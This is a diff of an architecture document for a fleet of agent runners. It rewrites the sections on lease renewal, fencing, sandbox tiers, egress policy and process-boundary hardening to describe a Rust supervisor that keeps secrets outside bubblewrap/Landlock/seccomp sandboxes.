@@ -18,10 +18,10 @@ Every row is extracted from the sections below; the owner column names the secti
 | Lease expiry backstop | `LEASE_TTL_MS` = 30 s (single-sourced for the control plane in `afd_core`'s timing constants) | reclaim sweep re-leases an expired lease with a higher fencing token | §Failure recovery model |
 | Max run duration | `MAX_RUNTIME_MS` hard cap | `/renew` extends to `min(now+LEASE_TTL_MS, created_at+MAX_RUNTIME_MS)` | §Per-lease renewal |
 | Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the lease | §System guarantees |
-| Sandbox failure fails closed | `UZ-RUN-007` | the child never starts; the lease stays redeliverable | §System guarantees |
+| Sandbox failure fails closed | `startup_posture` | the turn never runs; the lease reports `fleet_error` naming why, and nothing runs unsandboxed in its place | §System guarantees |
 | Renewal refused on empty wallet | `UZ-RUN-012` | coverage re-check on `/renew`; reachable for any exhausted tenant now that pricing comes from the catalogue | §Money gates |
 | Readiness recovery bound | `min-idle + ceil(active_fleets / 100) × interval` | `SWEEP_BATCH_LIMIT` = 100, keyset cursor on `(updated_at, id)`; ≈6 min at 100 fleets, ≈15 at 1 000, ≈55 at 5 000 | §Failure recovery model |
-| Runner datastore credentials | zero | `build_runner.zig` links no `pg` / `httpz` / `redis`; the only platform surface is `/v1/runners` + `agt_r` | §The split |
+| Runner datastore credentials | zero | no runner crate links `sqlx` or `redis`; the only platform surface is `/v1/runners` + `agt_r` | §The split |
 | Control protocol | five verbs | register · heartbeat · lease · report · activity; `me` resolves from the token | §The control protocol |
 | Enrollment gate | the `runner:enroll` scope | tenant `admin` JWT / `agt_t` key → `403`; `agt_r` revealed once, stored as sha256 | §Registering a runner |
 | Fresh-mint liveness | `last_seen_at = 0` sentinel | a never-connected runner reads `registered`, not a fake `online` | §Runner state |
@@ -30,8 +30,8 @@ Every row is extracted from the sections below; the owner column names the secti
 | Memory hydration | category-pinned byte window | every `core` entry first (newest-first), then the newest non-core entries; deterministic | §Memory continuity |
 | Per-runner metric families | 4, in a fixed 4096-series table | overflow routes to `runner_id="_other"`; bounded footprint; zero Postgres on the scrape path | §Observability |
 | Multi-replica gauges | counters exact via `sum by`; `active_leases` approximate | the `+1` grant and `−1` release can land on different replicas | §Multi-replica |
-| Sandbox tiers | 4 (`landlock_full` … `dev_none`) | release builds refuse `dev_none`; tier is orthogonal to egress policy | §Sandbox tiers |
-| Egress policies | 3 (`allow_all` default · `deny_all_egress` · `allow_list_egress`) | host-side default-deny `nftables` on a veth pair; port 53 dropped; IPv4-only at launch | §Egress model |
+| Sandbox tiers | 3 (`landlock_full` · `container_nested` · `dev_none`) | the daemon reconciles each against the host's report; tier is orthogonal to egress policy | §Sandbox tiers |
+| Egress policies | 3 (`allow_all` · `deny_all_egress` · `allow_list_egress`) | host-side default-deny nf_tables rules on a veth pair; port 53 dropped; IPv4 only | §Egress model |
 | Cancel latency | ≤ one heartbeat interval | revocation rides the heartbeat reply | §Steer, kill, pause |
 | Config freshness | resolved per lease | no cache, no reload signal; the next lease sees the change | §Config |
 | Debit points | 2, both on the lease path | receive (flat) + run (floor-token estimate) at issue; report reconciles telemetry only | §Money gates |
@@ -53,22 +53,22 @@ Each trap is enforced in its owner section; this list is the index.
 - Not a general scheduler: no autoscale, no fairness engine, no arbitrary workload types (§Scope).
 - A dashboard must not sum `agentsfleet_fleet_ready_depth`; every replica samples the same shared hash (§The four per-runner families).
 - Memory isolation does not rest on `fleet_id` scoping alone; a feature breaking single-live-holder must scope by `lease_id` first (§Memory continuity).
-- Lease secrets ride stdin, never argv or env; the child's environment is a fail-closed allowlist (§Process-boundary hardening).
+- No secret enters a sandbox: model keys and minted tokens stay in the supervisor, and bubblewrap starts every sandbox with a cleared environment (§Process-boundary hardening).
 - Config is never cached; warm mode reuses only the sandbox shell (§Cold and warm execution).
 - No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle — the deferred name-layer is eBPF/FQDN (§Egress model).
 
 ## Topology
 
 ```
- ┌─ PLATFORM ──┐      ┌─ HOST (bare metal / Mac / pod) ─┐
+ ┌─ PLATFORM ──┐      ┌─ HOST (bare metal or a VM) ─────┐
  │ agentsfleetd│      │ agentsfleet-runner (one binary) │
- │ control     │◀────▶│  parent loop: heartbeat,        │
- │ plane:      │ HTTPS│  lease, report, activity        │
+ │ control     │◀────▶│  supervisor: heartbeat, lease,  │
+ │ plane:      │ HTTPS│  agent loop, report, activity   │
  │ owns PG +   │ pull │  (boots from pre-minted agt_r)  │
  │ Dragonfly + │agt_r │                                 │
- │ Vault API + │      │    fork + sandbox per event     │
- │ assignment  │      │             ▼                   │
- └──────┬──────┘      │  sandboxed child: NullClaw      │
+ │ Vault API + │      │  a sandbox per lease that runs  │
+ │ assignment  │      │  a tool there      ▼            │
+ └──────┬──────┘      │  sandbox: executor, tool calls  │
         │             └─────────────────────────────────┘
   PG · Dragonfly · Vault
   (never leave the platform)
@@ -86,7 +86,7 @@ Deeper diagrams stay with their sections: the renewal timeline (§Per-lease rene
 | Lease expiry + fencing replaces `XAUTOCLAIM` | an off-platform processor is invisible to Dragonfly consumer-idle | §Datastore topology; M80_001 |
 | `fleet:ready` token is a UUIDv7, not a counter | an evicted counter restarts and re-issues a token a live poll still holds | §Datastore topology |
 | Cold-start reconciliation deferred | discovery scaffolding the future scheduler replaces (Indy-acked, M141_001 Discovery) | §Failure recovery model |
-| Engine folded in, child still forked | Landlock is one-way; the parent needs un-sandboxed network | §The split |
+| The agent loop runs in the supervisor; only tool calls cross into a per-lease sandbox | no model key or runner token enters a sandbox, and the supervisor keeps the network a sandbox may be denied | §The split; [Runner execution](./runner_execution.md) §Process model |
 | Renewal is a coverage check, not a re-bill | the run charge at issue covers the run; M80_010 later moves to per-slice Δ-debit | §Money gates |
 | Launch egress is IP-pin `nftables`; the name-layer comes later via eBPF/FQDN | no proxy and no TLS interception, at any tier | §Egress model |
 | Exact gauges via a deferred Postgres refresher | keeps the scrape path datastore-free; deferred at current scale | §The deferred refresher |
@@ -105,9 +105,9 @@ The runner fleet is an **execution plane**: stateless runners lease work, run it
 |---|---|---|
 | **No event loss on runner death** | A runner that crashes, partitions, or is killed mid-event never drops the event. | The lease has a `lease_expires_at`; the reclaim sweep re-leases an expired lease to another runner. Durability is at-least-once via `core.fleet_events` + `INSERT … ON CONFLICT DO NOTHING`. |
 | **At-most-once durable effect** | A reclaimed or duplicate runner cannot double-write state. | Every lease carries a monotonic `fencing_token`; `report` verifies it in the same atomic statement that flips the lease to `reported`. A stale holder's report is rejected (`UZ-RUN-005`). |
-| **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the lease inline over Transport Layer Security (TLS), is used only at the tool bridge inside the sandboxed child, and is never persisted runner-side. |
-| **Execution is always sandboxed** | No leased event ever runs un-isolated. | Each lease forks a child under Landlock + cgroups + a network namespace; a sandbox-setup failure fails **closed** — the child does not start, the runner reports `UZ-RUN-007`, and the lease is redeliverable. |
-| **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, Dragonfly, or the Vault. | `build_runner.zig` links no `pg` / `httpz` / `redis`; the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |
+| **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the lease inline over Transport Layer Security (TLS), is substituted at send time by the supervisor's egress guard outside every sandbox, and is never persisted runner-side ([Runner execution](./runner_execution.md) §Credentials). |
+| **Tool calls are always sandboxed** | No tenant program ever runs un-isolated. | A lease offered a tool that runs in a sandbox gets one under bubblewrap, Landlock, seccomp and its own cgroup; a sandbox that cannot be built fails **closed**: the turn never runs and the lease reports `fleet_error` as `startup_posture`. A lease whose tools all run in the supervisor starts none. |
+| **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, Dragonfly, or the Vault. | No runner crate links `sqlx` or `redis` ([Runner execution](./runner_execution.md) §Crates); the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |
 
 ### Runners are cattle, not pets
 
@@ -121,8 +121,8 @@ Recovery latency is **emergent from fleet polling density**, not a hard bound �
 |---|---|---|---|---|
 | Runner dies mid-lease | work resumes within ~`LEASE_TTL_MS` (30 s) + next lease latency | lease expiry + reclaim sweep re-leases with a higher fencing token | recovery latency is lazy (tied to the TTL), not push-driven | heartbeat-detected death → proactive reassignment; sub-10 s recovery |
 | Stale report after reclaim | immediate | `report` CAS verifies `fencing_token`; stale holder rejected (`UZ-RUN-005`) | the redone work by the new holder is the authority; the slow holder's compute is wasted | unchanged — fencing is the durable guard |
-| **Fleet outruns the lease TTL** | resolved (§3) — a live child renews its own lease | the runner auto-renews through the fenced `/renew` verb while the child is genuinely active (a progress frame, or a synthetic keepalive during a quiet-but-in-flight model call); liveness is decoupled from execution duration, bounded by a hard `MAX_RUNTIME_MS` cap | a child that stops emitting is **not** renewed — it expires at its deadline and is reclaimed + re-run; never double-run (fencing) | **shipped**; §1 cordon-drain + §2 heartbeat-lapse reassignment build on top |
-| Sandbox setup fails | immediate | child never starts; runner reports `fleet_error` (`UZ-RUN-007`); lease redeliverable | a host with a broken sandbox burns one lease attempt before the operator cordons it | cordon / reaping of hosts that repeatedly fail to establish a sandbox |
+| **Fleet outruns the lease TTL** | resolved (§3) — a live runner renews its own lease | the runner renews through the fenced `/renew` verb on every tick while the lease's task lives; liveness is decoupled from execution duration, bounded by a hard `MAX_RUNTIME_MS` cap | a runner that dies stops renewing — its lease expires at its deadline and is reclaimed + re-run; never double-run (fencing) | **shipped**; §1 cordon-drain + §2 heartbeat-lapse reassignment build on top |
+| Sandbox setup fails | immediate | the turn never runs; runner reports `fleet_error` as `startup_posture` | a host with a broken sandbox fails each lease it takes until the operator cordons it | cordon / reaping of hosts that repeatedly fail to establish a sandbox |
 | Control plane unreachable | bounded by runner backoff | runner retries with backoff; the un-acked lease redelivers | a runner that can't reach `agentsfleetd` does no work until the link returns | unchanged — the runner is the reconnect handler |
 | Assignment errors *after* winning a fleet's slot | next poll (~immediate) | `tryCandidate` releases the won `runner_affinity` slot before the error propagates — on the reclaim probe and on the fresh-envelope build alike — and logs `post_claim_error_released{stage}`. A release that itself fails degrades to the slot's own `leased_until` expiry | one poll is burned; the slot is not held for a full `LEASE_TTL_MS` on a transient database or allocation failure | unchanged — the release is token-guarded, so it can never free a *newer* holder's claim |
 | Readiness mark lost (Dragonfly unavailable at ingress, eviction, flush, lossy failover) | `fleet_xautoclaim_min_idle_ms` + `ceil(active_fleets / sweep batch)` × `fleet_reclaim_interval_ms` — **scales with fleet count** | the reclaim sweeper re-marks any fleet still holding deliverable work. Its probe compares the consumer group's `last-delivered-id` against the stream's `last-generated-id`, so it sees **undelivered** entries — the case `XAUTOCLAIM` can never reach, because an appended-but-unmarked entry is in nobody's pending list. It also re-marks on a non-empty PEL, which recovers another replica's strand a full pass sooner | the event is never lost; delivery is delayed. The sweep only re-marks and never clears: a false positive costs one wasted candidate check, a false negative strands an event | a scheduler subsumes discovery, replacing the polled backstop |
@@ -131,7 +131,7 @@ Recovery latency is **emergent from fleet polling density**, not a hard bound �
 >
 > The same arithmetic is the **cold-start** window. On first deploy the index is empty while streams already hold undelivered entries, so nothing is leasable until a sweep finds it. This is a deliberate, Indy-acked deferral (M141_001 Discovery): a boot-time reconciliation pass and a raised batch bound were both offered and declined, because both are discovery scaffolding the future scheduler replaces. What is *not* deferred is the keyset cursor — without it the fleets past the first batch are never reached at all rather than merely reached late.
 
-> **The renewal gap is closed (§3).** A live child renews its lease through the fenced `/renew` verb before `lease_expires_at`, so execution duration is decoupled from `LEASE_TTL_MS` — which stays short (single-sourced for the control plane in `afd_core`'s timing constants) as the silent-death backstop, *not* as the cap on how long a Fleet may run. Renewal is credit-gated and bounded by a hard `MAX_RUNTIME_MS` cap; a child that stops emitting is not renewed and is reclaimed at its deadline. The runner can now default for fleets that run well past the TTL.
+> **The renewal gap is closed (§3).** A live runner renews its lease through the fenced `/renew` verb before `lease_expires_at`, so execution duration is decoupled from `LEASE_TTL_MS` — which stays short (single-sourced for the control plane in `afd_core`'s timing constants) as the silent-death backstop, *not* as the cap on how long a Fleet may run. Renewal is credit-gated and bounded by a hard `MAX_RUNTIME_MS` cap; a runner that dies stops renewing, and its lease is reclaimed at its deadline. The runner can now default for fleets that run well past the TTL.
 
 ### Per-lease renewal — how a long fleet keeps its lease
 
@@ -145,23 +145,23 @@ A renewal pushes the kill-deadline forward while the runner's lease task lives. 
                                               │ < window? → POST /renew
                                               ▼
    server, in ONE fenced atomic statement:
-     • still the fencing holder?  no → 409 lease_lost  → runner kills child
+     • still the fencing holder?  no → 409 lease_lost  → runner cuts the run
      • credits cover the run?     no → 402 no_credits  → terminate
      • past created_at+MAX_RUNTIME_MS? yes → 409 max_runtime → terminate + report
      • else → extend lease_expires_at AND affinity.leased_until to
               min(now+LEASE_TTL_MS, created_at+MAX_RUNTIME_MS); bump last_seen_at
                                               │
    ┌────────────────────────────────────────────────────────────────────────────┐
-   │ The tick on a live-but-quiet child IS the synthetic keepalive — a long     │
-   │ model call with no progress frames still renews. A truly dead/dormant      │
-   │ child emits nothing, is never renewed, and is reclaimed at the deadline.   │
-   │ The Rust runner heartbeats beside its leases (heartbeat, drainer and       │
-   │ worker pool run joined), so a busy host still beats and §2                 │
-   │ lapse-detection never reassigns a live long-runner's own lease.            │
+   │ The tick renews whatever the run is doing, so a long model call with       │
+   │ no output still renews. A runner that died ticks no more, and its lease    │
+   │ is reclaimed at the deadline. The runner heartbeats beside its leases      │
+   │ (heartbeat, drainer and worker pool run joined), so a busy host still      │
+   │ beats and §2 lapse-detection never reassigns a live long-runner's own      │
+   │ lease.                                                                     │
    └────────────────────────────────────────────────────────────────────────────┘
 ```
 
-Fail-safe by construction: a transient `/renew` failure retries on the next tick (the window leaves slack); if it cannot renew by the deadline the child is killed and the event reclaimed + redone elsewhere — never double-run.
+Fail-safe by construction: a transient `/renew` failure retries on the next tick (the window leaves slack); if it cannot renew by the deadline the run is cut and the event reclaimed + redone elsewhere — never double-run.
 
 ## Scope — an execution plane, deliberately not a control plane
 
@@ -170,7 +170,7 @@ The fleet borrows Kubernetes / Nomad / Temporal **semantics** — leases, fencin
 - **Not a general scheduler — beyond label placement.** **Label** placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in **M85_001** (live: the lease query in `afd_fleet` matches `required_tags <@ labels`); capacity / fairness / autoscale stay out of scope. (The earlier "M80_007" reservation for this was a stale ID — M80_007 shipped as the runner-observability spec.)
 - **No autoscale.** Runners scale by operators adding hosts, not by the platform reacting to queue depth.
 - **No fairness engine.** No per-tenant weighting, no priority lanes, no preemption.
-- **No arbitrary workload types.** One workload: a NullClaw run from a leased `ExecutionPolicy`.
+- **No arbitrary workload types.** One workload: an agent run from a leased `ExecutionPolicy`.
 
 Without this fence the design rediscovers three control planes at once (Nomad-lite + Temporal-lite + Kubernetes-lite), each demanding its own observability, reconciliation, and high-availability story. The distributed-systems core here is sound; the risk is scope, not correctness. If the platform ever needs a true control plane, that is a larger upfront conversation (inventory / reconciliation / high-availability / placement fairness) — surface it, don't drift into it.
 
@@ -188,25 +188,22 @@ The cutover moved execution onto arbitrary hosts (bare metal, a Mac, a pod) that
 ## The split — two binaries, no sidecar
 
 - **`agentsfleetd`** — the control plane. Owns Postgres, Dragonfly, the Vault API, the HTTP API, and work assignment / fencing / reclaim. It gained the `/v1/runners` endpoints and does the `XREADGROUP` / `XACK` the worker used to do.
-- **`agentsfleet-runner`** — the host-resident execution plane. It is the parent control loop **plus the NullClaw execution engine linked in directly** (the old standalone sandbox sidecar is gone). It holds zero datastore credentials and talks to `agentsfleetd` only over Hypertext Transfer Protocol Secure (HTTPS), carrying a `runner_token`.
+- **`agentsfleet-runner`** — the host-resident execution plane, one Rust binary. A trusted supervisor runs the lease loop and the agent loop, and each lease that runs a tool in a sandbox gets one. It holds zero datastore credentials and talks to `agentsfleetd` only over Hypertext Transfer Protocol Secure (HTTPS), carrying a `runner_token`.
 
 The BEFORE/NOW split diagram is front-loaded in §Topology.
 
-**Why the engine folds in but still forks.** NullClaw runs the fleet: language-model calls plus tool calls, with tenant secrets substituted at the tool bridge. It needs a sandbox — Landlock (filesystem) + cgroups (memory/CPU) + a network namespace. Landlock is one-way and irreversible for a process, and the `agentsfleet-runner` parent loop needs un-sandboxed network to reach `agentsfleetd`. So the runner **forks a sandboxed child per event** and talks to it over a local pipe. One binary, two process roles: an un-sandboxed parent that speaks the control protocol, and a sandboxed child that runs NullClaw. There is no separate daemon to deploy.
+**Why the loop stays out of the sandbox.** The agent loop calls the model with the lease's key, and the supervisor speaks the control protocol with the runner's token; neither may sit where a tenant program runs. So the supervisor runs outside every sandbox, and a sandbox executes tool calls and nothing else, over one Unix socket per lease. The sandbox is the same binary's `sandbox` entry, bound read-only into it, so there is no second artifact to deploy ([Runner execution](./runner_execution.md) §Process model).
 
 ### Where the code lives
 
-The layout makes the "runner holds zero datastore credentials" guarantee **structural and grep-visible**, not merely enforced by `build_runner.zig`'s import list. The control plane and the execution plane never share a source tree; the only surface both reach is the frozen `/v1/runners` wire protocol, which each plane holds as its own module, so neither build graph reaches into the other's source.
+The layout makes the "runner holds zero datastore credentials" guarantee **structural and grep-visible**. The two build graphs share only the crates both planes need: `afd_wire` (the `/v1/runners` wire), `afd_core`, `afd_validate` and `afd_observability`. No runner crate links a datastore crate ([Runner execution](./runner_execution.md) §Crates).
 
 | Layer | Path | Build graph | Links | Role |
 |---|---|---|---|---|
-| wire contract, control plane | `rustd/crates/afd_wire` | `agentsfleetd` | none | frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
-| wire contract, runner | `src/lib/contract/` | `agentsfleet-runner` (named module) | none | the same frozen types on the host side |
-| shared knobs | `rustd/crates/afd_core` · `src/lib/common/` | one per plane | none | the knobs both planes key off (`LEASE_TTL_MS`, …) |
-| runner logging | `src/lib/logging/` | `agentsfleet-runner` (named module) | none | logfmt scope helpers |
+| wire | `rustd/crates/afd_wire` | both | none | the frozen `/v1/runners` wire types — protocol, event envelope, execution policy, execution result, activity |
+| shared knobs | `rustd/crates/afd_core` | both | none | the knobs both planes key off (`LEASE_TTL_MS`, …), `error_shell!` |
 | control plane | `rustd/crates/afd_fleet` · `rustd/crates/afd_runner` · `rustd/crates/afd_api_runner` | `agentsfleetd` (`rustd/crates/agentsfleetd`) | `sqlx`, `redis` | lease / fence / reclaim / assignment, the four background sweeps, and the `/v1/runners` handlers over them |
-| runner daemon | `src/runner/daemon/`, `src/runner/{main,child_supervisor,child_exec,sandbox_args,pipe_proto}.zig` | `agentsfleet-runner` (`build_runner.zig`) | none | runner-side process; imports nothing from the control plane |
-| runner engine | `src/runner/engine/` | `agentsfleet-runner` | none (NullClaw base) | the folded-in NullClaw engine + sandbox glue (`cgroup`, `landlock`, `network`) |
+| runner | `rustd/crates/afr_supervisor` · `afr_agent` · `afr_providers` · `afr_tools` · `afr_egress` · `afr_secrets` · `afr_memory` · `afr_executor` · `afr_sandbox` · `afr_telemetry` | `agentsfleet-runner` (`rustd/crates/agentsfleet_runner`) | none | supervisor, agent loop, tool catalog, outbound guard, executor and sandbox engine; imports nothing from the control plane |
 
 ## The control protocol — `/v1/runners`
 
@@ -258,9 +255,9 @@ The **heartbeat cadence travels the same way** (M205). `afd_core::timing` owns b
 
 The host never declares policy. The per-policy environment variables that once did are removed outright rather than deprecated, so there is no fallback path two sources of truth could diverge through. The failure that removes: a dev worker advertised `landlock_full` while refusing every lease for two days, because the dashboard's tier and the host's env file held different values and nothing compared them.
 
-Before capability can be reported it has to be established: systemd's `Delegate=` makes the controllers *available* in the unit cgroup, but writing `cgroup.subtree_control` is the delegatee's job and systemd never does it. The daemon does it once at **startup** (`daemon/startup.zig`), not on the first cage-building assignment — which controllers the subtree carries is a host fact settled before any policy exists. That ordering is what makes a populated subtree a post-condition of the daemon being up, so the probe below reports a settled value and the bootstrap playbook's post-deploy readiness gate is not racing the first heartbeat.
+Before capability can be reported it has to be established. systemd's `Delegate=cpu io memory pids` with `DelegateSubgroup=runner` starts the runner in a leaf of its own and hands it the service's cgroup (`deploy/baremetal/agentsfleet-runner.service`). The runner reads that cgroup from `/proc/self/cgroup` and makes every lease's cgroup beneath it (`rustd/crates/afr_sandbox/src/cgroup.rs`). The runner playbook's readiness check fails a host whose service cgroup does not carry every required controller in its `cgroup.subtree_control` (`playbooks/lib/runner/verify.sh`).
 
-Capability flows **up**. At startup and on every heartbeat tick, the daemon probes what the kernel can actually enforce: Landlock ABI, seccomp installability, delegated cgroup `subtree_control` controllers, bubblewrap presence, and `egress_enforcement` (pinned false until the `EgressScope` wiring ships). It sends the report on the first beat and again whenever the answer changes (`capability_probe.zig`).
+Capability flows **up**. At boot the runner probes what the kernel can enforce: Landlock, seccomp, the delegated cgroup's controllers, bubblewrap, the toolbox's file system, `/dev/kvm`, and whether it can build an egress scope (§Egress model). A host lacking any mechanism every sandbox needs refuses `run` and says which (`rustd/crates/agentsfleet_runner/src/main.rs`). Every heartbeat carries the boot probe's report, with `egress_enforcement` set from the egress check (`rustd/crates/afr_supervisor/src/capability.rs`, `rustd/crates/afr_supervisor/src/heartbeat.rs`).
 
 The heartbeat handler reconciles assigned against achievable through a pure verdict function (`afd_runner`'s reconcile module), writing the row's `degraded` flag and `degraded_reason`. The reason names the one missing mechanism in operator vocabulary — "cgroup controllers not delegated" maps to a bootstrap playbook step.
 
@@ -373,30 +370,27 @@ Three load-bearing facts:
 
 If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role — name it `fleet_runtime`, back it with its own pool, and justify it with a real threat model that treats the fleet writes as a distinct compromise surface. It is never a runner-named role, and it stays out of scope while `agentsfleetd` runs a single write pool: a second role with no second pool or code path is the dead-role anti-pattern the role-consolidation work exists to eliminate.
 
-## Running one event (NullClaw)
+## Running one event
 
-This section describes the Zig runner. [Runner execution](./runner_execution.md) describes the Rust runner that supersedes it; the control protocol is shared.
-
-A `lease` reply is the runner's entire input for an event. The runner forks a sandboxed child, the child runs NullClaw, and the result goes back via `report`.
+A `lease` reply is the runner's entire input for an event. The runner runs the event's turn and sends the result back with `report`. [Runner execution](./runner_execution.md) §"One lease, end to end" walks the runner's side.
 
 ```
-lease → { event, ExecutionPolicy(config + secrets_map + network_policy + tool_allowlist),
-          instructions, lease_id, fencing_token, checkpoint?, bundle_manifest? }
+lease → { event, ExecutionPolicy(tools + secrets_map + mintable + provider + network_policy
+          + repository_binding + origin rules + context budget), instructions, lease_id,
+          fencing_token, lease_expires_at, limits?, history, bundle?, resume_hold }
    (`instructions` = the installed fleet's SKILL.md body, extracted server-side by
-    FleetSession; the runner composes the NullClaw turn from instructions + event so
-    the installed behaviour runs on every trigger. Soft reasoning input, never a secret
-    — provider key + secrets_map stay in ExecutionPolicy / the tool bridge. M84_008.)
-   (`bundle_manifest` appears only for fleets installed from Fleet Bundles. It carries
-    immutable snapshot metadata and support-file paths, never resolved credentials.)
+    FleetSession; the agent loop builds the system prompt from it so the installed
+    behaviour runs on every trigger. Soft reasoning input, never a secret: the
+    provider key and secrets_map stay in ExecutionPolicy and the supervisor. M84_008.)
+   (`bundle` appears only for fleets installed from Fleet Bundles. It carries the
+    snapshot's content hash, never resolved credentials.)
    │
-agentsfleet-runner parent (child_supervisor.zig): establish the cgroup, fork, exec self as
-   `agentsfleet-runner __execute` under bwrap (unshare-all + ro-system + rw-workspace),
-   materialize bundle support files into the lease workspace when present, feed the lease over
-   the child's stdin, read framed frames off its stdout under the lease deadline
+agentsfleet-runner supervisor: admit the policy, take the fleet's turn, fetch the bundle,
+   hydrate memory; when a tool runs in a sandbox, take the fleet's held sandbox or build
+   one, check the bound repositories out and land the bundle's support files in it
    │
-   └─ sandboxed child (child_exec.zig): apply mandatory Landlock, build config + tool set from
-      the policy, run the NullClaw turn — language-model calls + tool calls, secrets substituted
-      at the tool bridge — emit activity frames + the final result over stdout
+   └─ agent loop (in the supervisor): model calls with the lease's key; each tool call
+      runs where its runtime says, in the supervisor or through the sandbox's executor
    │
 report → agentsfleetd: one transaction (settle + terminal state + checkpoint
          + freed slot + the OWED DELIVERY), then — after it commits — the
@@ -413,50 +407,42 @@ runner retries; a report whose RESPONSE is lost retries into a lease already `re
 by that same runner and is answered with the stored outcome for no charge. See
 [`data_flow.md`](./data_flow.md) §"C. EXECUTE".
 
-The pre-cutover TOCTOU (Time-Of-Check-To-Time-Of-Use) guards — lease re-check before a run, orphan reaping, idempotent destroy — moved inside the runner as parent↔child supervision: the parent reaps orphan-safe, kills the cgroup tree on a deadline overrun, and `destroy()`s idempotently. The durable lease guard lives in `agentsfleetd` via `lease_expires_at` + `fencing_token` (see **Reclaim** below). The fork model is **fork-then-exec-self under bwrap**: bwrap owns the unprivileged user/network-namespace dance (raw `unshare` needs privilege) and gives the child a clean address space.
+The durable lease guard lives in `agentsfleetd` via `lease_expires_at` + `fencing_token` (see **Reclaim** below). On the runner, each lease is one task that owns its sandbox: a sandbox is held or destroyed exactly once, and the engine's boot sweep removes what a crashed runner left ([Runner execution](./runner_execution.md) §"A lease's sandbox today").
 
-Fleet Bundle support files are mounted as workspace files, not pasted into the model prompt.
+Fleet Bundle support files are written into the lease's workspace, not pasted into the model prompt.
 `SKILL.md` may instruct the fleet to read `SOUL.md`, `ZOHO.md`, scripts, examples, or assets,
 but those files do not grant tools, network, or secrets by themselves. A missing or corrupt
 bundle snapshot is a startup failure before the model is invoked.
 
 ### Process-boundary hardening
 
-bwrap (namespaces) + Landlock (filesystem) + cgroup (kill/limit) are the headline layers, but the **process boundary underneath them** carries its own guarantees — what the child inherits across `fork`/`exec`, and how its tree is reaped. These sit below the namespace/LSM layer and close paths that the isolation layers do not:
+bubblewrap (namespaces), Landlock (file system), seccomp (system calls) and the lease's cgroup (kill and limits) are the headline layers. [Runner execution](./runner_execution.md) §"Sandbox engines" owns each one. The process boundary underneath them carries its own guarantees:
 
-- **Filtered environment.** `AGENTSFLEET_RUNNER_TOKEN` (the daemon's control-plane credential) and every other daemon-only var live in the *parent's* environment. The child is spawned with a **fail-closed allowlist** `environ_map` (`PATH`, the engine's optional knobs, the TLS CA path) — it inherits only what tool execution needs, never the `AGENTSFLEET_`/`RUNNER_` namespace. `HOME` is **assigned, not inherited**: the daemon's own `HOME` is its `RuntimeDirectory` on the host, a path no bind list carries and no Landlock rule covers, so a child that inherited it resolved its config directory onto `EACCES` and every lease died before its first model call. The child receives `contract.protocol.CHILD_HOME` instead — on the per-lease tmpfs floor bwrap builds and Landlock grants write to, so it exists by construction and dies with the lease. A prompt-injected fleet reading its own `/proc/self/environ` or calling `getenv` finds the token structurally absent. (The cross-process `/proc/<daemon>/environ` read is already shut by the pid namespace.) Lease secrets still ride **stdin**, never argv/env.
-- **No privilege escalation.** The child sets `PR_SET_NO_NEW_PRIVS` before `landlock_restrict_self`, so a setuid binary in the read-only system mounts can never raise privilege. It is additive — it does not remove the user-namespace `CAP_SYS_ADMIN` that Landlock currently rides.
-- **No controlling terminal.** `--new-session` detaches the child from any tty, closing terminal-input injection (`TIOCSTI`).
-- **Absolute `argv[0]`.** The exec target is asserted absolute before spawn, so a child program is never resolved through the parent's `$PATH`.
-- **Un-emptyable kill domain.** The cgroup is the primary atomic kill domain, but the parent **always also** signals the child's process group, and **fails the lease closed** if cgroup enrollment fails. Otherwise the child would run unmetered in the daemon's cgroup, and a kill on the empty exec-cgroup would reap nothing. A forking fleet's whole tree dies on revocation/timeout.
-- **Engine spawns need the process Io — granted to the child arms only.** The engine's compat layer (`nullclaw.compat`) spawns its curl provider transport through the process `Io`; the runner hands it over via `nullclaw.compat.initProcess(init)` — the same call NullClaw's own binary makes — but **only** on the `__execute` and `__selftest_probe` dispatch arms, before either runs. Skipping it does not fail loud: the compat layer silently falls back to Zig's `Io.Threaded.init_single_threaded`, whose allocator is `.failing` (Zig 0.16), so every provider spawn dies **pre-fork** with a synthetic `OutOfMemory` that `mapError` then mislabels `oom_kill` on the event. The daemon mode is EXCLUDED deliberately: it runs no engine today, so leaving it on the failing fallback keeps a future daemon-context NullClaw spawn dying loud instead of silently inheriting the daemon's full environment — runner token included — and no stored `Io` outlives the daemon's own teardown. The probe's `enginespawn=` check is the tripwire: it drives one spawn through this exact plumbing from the built binary, so a lost `initProcess` call turns the self-test and the hardening lane red.
+- **Nothing to steal inside.** The agent loop, the model key, the runner token and every minted credential stay in the supervisor. A sandbox's entry is told only the tenant leaf's descriptors and, when one is set, the log level (`rustd/crates/afr_sandbox/src/bubblewrap.rs`).
+- **A cleared environment.** bubblewrap starts every sandbox with `--clearenv`, so nothing of the runner's environment, `AGENTSFLEET_RUNNER_TOKEN` included, reaches a tenant process.
+- **No privilege escalation.** The entry sets `no_new_privs`, then applies Landlock, then seccomp, before it serves (`rustd/crates/afr_sandbox/src/harden.rs`). bubblewrap drops every capability with `--cap-drop ALL` and refuses nested user namespaces with `--disable-userns`.
+- **No controlling terminal.** `--new-session` detaches the sandbox from any terminal, closing terminal-input injection (`TIOCSTI`). `--die-with-parent` ends it with the runner.
+- **An absolute entry.** The runner binary is bound read-only at `/opt/agentsfleet/agentsfleet-runner` and started by that path, never through `$PATH`.
+- **Un-emptyable kill domain.** bubblewrap is born inside the lease's cgroup: the spawn writes itself into `cgroup.procs` before `exec` (`rustd/crates/afr_sandbox/src/bubblewrap_engine/parts.rs`). Every process the fleet starts moves into the cgroup's `tenant` leaf before its own `exec`, and a move that fails refuses the spawn. Teardown writes `cgroup.kill`, so a forking fleet's whole tree dies.
 
